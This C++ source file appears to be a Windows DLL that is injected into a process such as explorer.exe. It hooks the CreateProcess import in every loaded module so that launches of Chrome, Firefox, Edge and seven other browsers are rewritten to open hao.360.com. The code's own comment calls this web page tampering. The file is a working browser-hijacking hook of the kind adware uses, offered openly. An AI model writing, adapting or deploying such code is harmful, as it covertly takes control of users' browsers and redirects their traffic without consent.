// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "IATHook.cpp"

int __stdcall test(int x,int y)
{
    return x + y;
}

/*
问题:
① win7 explorer 移动了 iat，如果只iat hook explorer.exe 一个模块，是无效的，
   可以把 explorer 进程内所有模块都 逐一hook。
*/


// 系统的
typedef BOOL(WINAPI *FCreateProcess)(
    _In_opt_ LPCWSTR lpApplicationName,
    _Inout_opt_ LPWSTR lpCommandLine,
    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ BOOL bInheritHandles,
    _In_ DWORD dwCreationFlags,
    _In_opt_ LPVOID lpEnvironment,
    _In_opt_ LPCWSTR lpCurrentDirectory,
    _In_ LPSTARTUPINFOW lpStartupInfo,
    _Out_ LPPROCESS_INFORMATION lpProcessInformation
    );
FCreateProcess fCreateProcess = (FCreateProcess)CreateProcess;

// 我的
BOOL 
WINAPI 
WebPageBind(
_In_opt_ LPCWSTR lpApplicationName,
_Inout_opt_ LPWSTR lpCommandLine,
_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
_In_ BOOL bInheritHandles,
_In_ DWORD dwCreationFlags,
_In_opt_ LPVOID lpEnvironment,
_In_opt_ LPCWSTR lpCurrentDirectory,
_In_ LPSTARTUPINFOW lpStartupInfo,
_Out_ LPPROCESS_INFORMATION lpProcessInformation
);
DWORD WINAPI ThreadProc(LPVOID lpParamter);



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);

        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


// 网页篡改
BOOL
WINAPI 
WebPageBind(
    _In_opt_ LPCWSTR lpApplicationName,
    _Inout_opt_ LPWSTR lpCommandLine,
    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ BOOL bInheritHandles,
    _In_ DWORD dwCreationFlags,
    _In_opt_ LPVOID lpEnvironment,
    _In_opt_ LPCWSTR lpCurrentDirectory,
    _In_ LPSTARTUPINFOW lpStartupInfo,
    _Out_ LPPROCESS_INFORMATION lpProcessInformation
)
{
    TCHAR lpNewCommandLine[MAX_PATH] = { 0 };
    TCHAR szDbgInfo[0x1024] = { 0 };
    TCHAR* comBrowserAppList[10]=
    {
        (TCHAR*)TEXT("chrome.exe"),
        (TCHAR*)TEXT("firefox.exe"),
        (TCHAR*)TEXT("msedge.exe"),
        (TCHAR*)TEXT("safari.exe"),
        (TCHAR*)TEXT("opera.exe"),
        (TCHAR*)TEXT("360se.exe"),
        (TCHAR*)TEXT("sogouexplorer.exe"),
        (TCHAR*)TEXT("QQBrowser.exe"),
        (TCHAR*)TEXT("UCBrowser.exe"),
        (TCHAR*)TEXT("LBBrowser.exe")
    };

    //wsprintf(szDbgInfo,TEXT("lpApplicationName: %s\nlpCommandLine: %s\n"), lpApplicationName, lpCommandLine);
    //MessageBox(0,szDbgInfo,TEXT("Tip"),0);

    for (UINT i = 0; i < 10; i++)
    {
        if (lpApplicationName && wcsstr(lpApplicationName, comBrowserAppList[i]))
        {

            wsprintf(lpNewCommandLine,TEXT("%s %s"), lpApplicationName, TEXT(" hao.360.com"));
            lpApplicationName = NULL;
            lpCommandLine = lpNewCommandLine;
            break;
        }

        if (lpCommandLine && wcsstr(lpCommandLine, comBrowserAppList[i]))
        {
            wsprintf(lpNewCommandLine, TEXT("%s %s"), lpCommandLine, TEXT(" hao.360.com"));
            lpApplicationName = NULL;
            lpCommandLine = lpNewCommandLine;
            break;
        }

    }
    //wsprintf(szDbgInfo, TEXT("lpApplicationName: %s\nlpCommandLine: %s\n"), lpApplicationName, lpCommandLine);
    //MessageBox(0, szDbgInfo, TEXT("Tip"), 0);
    return fCreateProcess(
        lpApplicationName,
        lpCommandLine,
        lpProcessAttributes,
        lpThreadAttributes,
        bInheritHandles,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        lpStartupInfo,
        lpProcessInformation
    );

    //return TRUE;
}


DWORD WINAPI ThreadProc(LPVOID lpParamter)
{
    HMODULE hModuleList[1024] = { 0 };
    DWORD dwcbNeeded=0;
    EnumProcessModules(GetCurrentProcess(), hModuleList, sizeof(hModuleList),&dwcbNeeded);
    TCHAR szModule[MAX_PATH] = { 0 };

    // 遍历进程每一模块的iat，逐一修改
    for (UINT i = 0; i < (DWORD)(dwcbNeeded / sizeof(HMODULE)); i++)
    {
        ZeroMemory(szModule, MAX_PATH *sizeof(TCHAR));
        GetModuleFileNameEx(GetCurrentProcess(), hModuleList[i], szModule, MAX_PATH);
        if (!IsPE(szModule)) continue;
        //MessageBox(0, szModule,0,0);
        IATHook(fCreateProcess, NULL, WebPageBind, szModule);
    }

    MessageBox(0, TEXT("hook successful."), 0, 0);

    return 0;
}